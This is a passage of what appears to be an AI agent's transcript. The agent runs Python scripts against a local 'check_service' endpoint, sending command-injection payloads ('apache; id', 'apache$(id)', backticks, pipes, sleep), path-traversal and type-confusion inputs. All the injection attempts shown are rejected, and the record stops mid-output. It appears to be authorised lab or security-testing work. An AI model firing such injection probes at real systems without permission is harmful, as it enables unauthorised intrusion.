--- iter 4 bash --- $ python3 - <<'PY' import requests, time, json url='http://127.0.0.1:9117/check_service' payloads=['apache','mysql','nginx','ssh','apache; id','apache && id','apache`id`','apache$(id)','apache; sleep 3','apache | id','; id #'] for p in payloads: t=time.time() try: r=requests.post(url,json={'service_name':p},timeout=8) dt=time.time()-t print('===',repr(p),'dt',round(dt,3),'status',r.status_code,'len',len(r.content),'ctype',r.headers.get('content-type')) print(r.text) except Exception as e: print('ERR',repr(p),e) PY === 'apache' dt 0.053 status 200 len 42 ctype application/json {"service_name":"apache","status":"true"} === 'mysql' dt 0.041 status 200 len 41 ctype application/json {"service_name":"mysql","status":"true"} === 'nginx' dt 0.039 status 200 len 41 ctype application/json {"service_name":"nginx","status":"true"} === 'ssh' dt 0.04 status 200 len 39 ctype application/json {"service_name":"ssh","status":"true"} === 'apache; id' dt 0.004 status 400 len 33 ctype application/json {"error":"Invalid service name"} === 'apache && id' dt 0.002 status 400 len 33 ctype application/json {"error":"Invalid service name"} === 'apache`id`' dt 0.002 status 400 len 33 ctype application/json {"error":"Invalid service name"} === 'apache$(id)' dt 0.002 status 400 len 33 ctype application/json {"error":"Invalid service name"} === 'apache; sleep 3' dt 0.003 status 400 len 33 ctype application/json {"error":"Invalid service name"} === 'apache | id' dt 0.002 status 400 len 33 ctype application/json {"error":"Invalid service name"} === '; id #' dt 0.002 status 400 len 33 ctype application/json {"error":"Invalid service name"} [stderr] /Users/faber/Library/Python/3.9/lib/python/site-packages/urllib3/__init__.py:35: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL 1.1.1+, currently the 'ssl' module is compiled with 'LibreSSL 2.8.3'. See: https://github.com/urllib3/urllib3/issues/3020 warnings.warn( --- iter 5 bash --- $ python3 - <<'PY' import requests, time, json, hashlib url='http://127.0.0.1:9117/check_service' probes=[ ('GET',None,None),('POST_empty',None,''),('POST_json_empty',{},None),('POST_no_service',{'x':'apache'},None), ('apache2',{'service_name':'apache2'},None),('cron',{'service_name':'cron'},None),('nosuch',{'service_name':'nosuch'},None), ('dot',{'service_name':'apache.service'},None),('dash',{'service_name':'apache-service'},None),('under',{'service_name':'apache_service'},None),('space',{'service_name':'apache id'},None), ('slash',{'service_name':'../../bin/sh'},None),('newline',{'service_name':'apache\nid'},None),('tab',{'service_name':'apache\tid'},None), ('unicode',{'service_name':'apache；id'},None),('urlenc',{'service_name':'apache%3Bid'},None), ('list',{'service_name':['apache',';id']},None),('dict',{'service_name':{'x':'apache;id'}},None),('int',{'service_name':123},None),('none',{'service_name':None},None), ] for name,obj,raw in probes: t=time.time() try: if name=='GET': r=requests.get(url,timeout=5) elif raw is not None: r=requests.post(url,data=raw,timeout=5) else: r=requests.post(url,json=obj,timeout=5) print('===',name,'dt',round(time.time()-t,3),'status',r.status_code,'len',len(r.content),'sha',hashlib.sha256(r.content).hexdigest()[:10]) print(r.text) except Exception as e: print('ERR',name,type(e),e) print('--- form-encoded variants') for p in ['apache','apache;id','apache%3bid','apache+%26%26+id']: r=requests.post(url,data='service_name='+p,headers={'Content-Type':'application/x-www-form-urlencoded'},timeout=5) print(p, r.status_code, r.text) PY === GET dt 0.007 status 405 len 153 sha bfb286554b 405 Method Not Allowed
